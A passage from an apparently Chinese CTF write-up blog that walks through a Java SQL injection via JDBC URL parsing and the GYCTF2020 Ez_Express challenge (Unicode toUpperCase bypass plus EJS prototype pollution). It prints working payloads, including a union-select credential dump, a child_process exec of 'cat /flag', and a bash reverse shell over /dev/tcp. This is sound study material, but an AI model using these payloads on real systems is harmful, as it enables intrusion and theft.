class="hljs-params">(List&lt;Row&gt; list)</span> &#123;<br>        <span class="hljs-built_in">this</span>.list = list;<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/124003575">参考文章</a></p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/u6ks9KJMm/">参考文章</a></p>
<p>首先是这部分，存在<code>SQL</code>注入：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (dbName != <span class="hljs-literal">null</span> &amp;&amp; !dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;<br>      &#125; <br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="hljs-string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>其实正常<code>SQL</code>注入肯定想着用注释号去注释某部分<code>SQL</code>语句，对于<code>Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#39;&quot; + dbName + &quot;&#39; and table_name=&#39;&quot; + TableName + &quot;&#39;;</code>这个<code>SQL</code>语句肯定想着<code>dbName</code>是注入点，但<code>dbName</code>这东西还会带入到<code>dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;</code>这个赋值语句里。</p>
<p>jdbc类似URL解析。所以当我们输入<code>myapp#&#39; union select 1#</code>时， <code>#</code>在URL中是锚点。所以有：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">jdbc:mysql://mysqldbserver:3306/myapp<span class="hljs-comment">#&#x27; union select 1#</span><br>会被解析成<br>jdbc:mysql://mysqldbserver:3306/myapp<br><br>再带入sql语句<br>Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = <span class="hljs-string">&#x27;叉叉叉#&#x27;</span> union <span class="hljs-keyword">select</span> 1<span class="hljs-comment">#&#x27; and table_name=&#x27;&quot; + TableName + &quot;&#x27;</span><br>参考文章里对第一个<span class="hljs-comment">#号的解释是因为被引号包裹了所以被认为是普通字符：</span><br>第一个<span class="hljs-comment">#被单引号包裹。成了普通的#字符。第二个#注释掉了后面的语句。造成sql注入</span><br></code></pre></td></tr></table></figure>

<p>当然，这里用<code>?</code>也行，比如(不过注意用了?一定要成键值对)：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">jdbc</span>:mysql://localhost:<span class="hljs-number">3306</span>/myapp?a=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure>



<p>接下来就是<code>import io.swagger.annotations.ApiOperation;</code>这个东西：</p>
<blockquote>
<p>swagger 提供了一个用于浏览和测试 API 的交互式用户界面，通常称为 Swagger UI。当你在应用程序中集成了 Swagger，并启动应用程序时，Swagger UI 将在 <code>/swagger-ui.html</code> 路径上提供一个可视化的界面，展示了你的 API 的各种信息，包括接口、参数、响应等。</p>
</blockquote>
<p>访问，三个路由：</p>
<p><img src="/img/wdbthinkjava1.png" srcset="/img/loading.gif" lazyload alt="wdbthinkjava1"></p>
<p><img src="/img/wdbthinkjava2.png" srcset="/img/loading.gif" lazyload alt="wdbthinkjava2"></p>
<p>后面就是爆库报表爆列，这里不详细说了，最后爆用户名和密码的<code>payload</code>:</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">dbName=myapp#&#x27; union <span class="hljs-keyword">select</span> group_concat(name,<span class="hljs-number">0x7e</span>,pwd)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">user</span>)#<br>得到：<br>admin~admin@Rrrr_ctf_asde<br></code></pre></td></tr></table></figure>

<p>我看网上很多<code>wp</code>都直接在<code>swagger</code>那里操作了。。但我这个不行，只好用burp抓包修改：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin@Rrrr_ctf_asde&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/wdbthinkjava4.png" srcset="/img/loading.gif" lazyload alt="wdbthinkjava4"></p>
<p>下面要把这东西放到<code>/common/user/current</code>路由认证一下，我的环境有问题就用其它师傅的图了：</p>
<p><img src="/img/wdbthinkjava5.png" srcset="/img/loading.gif" lazyload alt="wdbthinkjava5"></p>
<p>接下来是对这个字符串的分析：</p>
<blockquote>
<p>一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。<br> 或者如果以aced开头，那么他就是这一段Java序列化的16进制。</p>
</blockquote>
<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p><code>www.zip</code>泄露：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//index.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>(); <br><span class="hljs-keyword">const</span> <span class="hljs-title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="hljs-property">constructor</span> &amp;&amp; obj.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">a, b</span>) =&gt; &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isObject</span>(a[attr]) &amp;&amp; <span class="hljs-title function_">isObject</span>(b[attr])) &#123;<br>      <span class="hljs-title function_">merge</span>(a[attr], b[attr]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">clone</span> = (<span class="hljs-params">a</span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, a);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeKeyword</span>(<span class="hljs-params">keyword</span>) &#123;<br>  <span class="hljs-keyword">if</span>(keyword.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>)&#123;<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  res.<span class="hljs-property">outputFunctionName</span>=<span class="hljs-literal">undefined</span>;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>&#125;);<br>&#125;);<br><br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br><br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_">safeKeyword</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>))&#123;<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>.<span class="hljs-title function_">toUpperCase</span>(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>==req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>&amp;&amp;req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>==req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">passwd</span>)&#123;<br>      req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">isLogin</span>=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br>&#125;)<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><br><span class="hljs-comment">//app.js</span><br><span class="hljs-keyword">var</span> createError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-errors&#x27;</span>);<br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> logger = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> indexRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/index&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-comment">// view engine setup</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">disable</span>(<span class="hljs-string">&#x27;etag&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomize</span>(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span><br>&#125;))<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">logger</span>(<span class="hljs-string">&#x27;dev&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/&#x27;</span>, indexRouter);<br><br><span class="hljs-comment">// catch 404 and forward to error handler</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>));<br>&#125;);<br><br><span class="hljs-comment">// error handler</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-comment">// set locals, only providing error in development</span><br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">message</span> = err.<span class="hljs-property">message</span>;<br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">error</span> = req.<span class="hljs-property">app</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;env&#x27;</span>) === <span class="hljs-string">&#x27;development&#x27;</span> ? err : &#123;&#125;;<br><br>  <span class="hljs-comment">// render the error page</span><br>  res.<span class="hljs-title function_">status</span>(err.<span class="hljs-property">status</span> || <span class="hljs-number">500</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = app;<br></code></pre></td></tr></table></figure>

<p>注意<code>merge</code>和<code>clone</code>，初步判断是原型链污染。</p>
<p>先设置了这么个东西，匹配大小写的<code>admin</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeKeyword</span>(<span class="hljs-params">keyword</span>) &#123;<br>  <span class="hljs-keyword">if</span>(keyword.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>在注册时不让你注册<code>admin</code>用户名(大小写)：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_">safeKeyword</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>))&#123;<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br></code></pre></td></tr></table></figure>

<p>但后面<code>/action</code>和<code>/info</code>路由限制只能<code>admin</code>用户才能操作：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br>&#125;)<br></code></pre></td></tr></table></figure>

<p><code>clone</code>和<code>merge</code>这东西理解成深拷贝就行。</p>
<p>但注意这个<code>req.session.user</code>是怎么来的：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>=&#123;<br>  <span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>.<span class="hljs-title function_">toUpperCase</span>(),<br>  <span class="hljs-string">&#x27;passwd&#x27;</span>: req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>,<br>  <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>利用<code>toUpperCase()</code>函数对<code>userid</code>进行大写处理。其实这种转码很容易出现问题，比如对于拉丁文字母<code>ı</code>：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Welcome <span class="hljs-keyword">to</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Node</span>.</span></span>js v18.<span class="hljs-number">18.0</span>.<br>Type <span class="hljs-string">&quot;.help&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt; <span class="hljs-string">&quot;ı&quot;</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">UpperCase()</span><span class="hljs-operator"> == </span><span class="hljs-character">&#x27;I&#x27;</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>

<p>参考<code>https://blog.csdn.net/qq_45691294/article/details/109320437</code></p>
<p>所以注册个<code>admın</code>然后就能以<code>admin</code>身份登录。</p>
<p>登录之后能进<code>info</code>和<code>action</code>路由，注意<code>clone</code>和<code>render</code>函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">res.<span class="hljs-property">outputFunctionName</span>=<span class="hljs-literal">undefined</span>;<br><br>req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br><br>res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br><br></code></pre></td></tr></table></figure>

<p><code>/info</code>路由会渲染这个并不存在的<code>outputFunctionName</code>属性，但并不知道这个东西和原型链污染能扯上啥关系。。网上的<code>payload</code>普遍是这么构造的，而且也没说原因(可能是太简单？)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;);var _tmp2&quot;</span><br>  &#125;<br>&#125;<br><br>&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/9001 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>后面翻了翻，来自<code>hardjs</code>这道题：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">......<br>      prepended += <span class="hljs-string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">outputFunctionName</span>) &#123;<br>        prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.<span class="hljs-property">outputFunctionName</span> + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">_with</span> !== <span class="hljs-literal">false</span>) &#123;<br>        prepended +=  <span class="hljs-string">&#x27;  with (&#x27;</span> + opts.<span class="hljs-property">localsName</span> + <span class="hljs-string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>        appended += <span class="hljs-string">&#x27;  &#125;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      &#125;<br>......<br></code></pre></td></tr></table></figure>

<p>将<code>opts.outputFunctionName</code>拼接到了语句中，而上下文并未出现<code>outputFunctionName</code>这个属性，因此通过污染原型链来在此处进行<code>SSTI</code>，拼接的前面有一个<code>var</code>，而后面有一个<code>__append</code>，这就是<code>payload</code>前后拼接了奇怪内容的原因。</p>
<p>访问<code>/info</code>路由能看到自己构造的<code>payload</code>，不过这题好像不能出网了，反弹shell没法用：</p>
<p><img src="/img/ezexpresswhat.png" srcset="/img/loading.gif" lazyload alt="ezexpresswhat"></p>
<p>参考<code>https://blog.z3ratu1.top/[GYCTF2020]ezExpress.html</code>，主要是对这个payload的解释：</p>
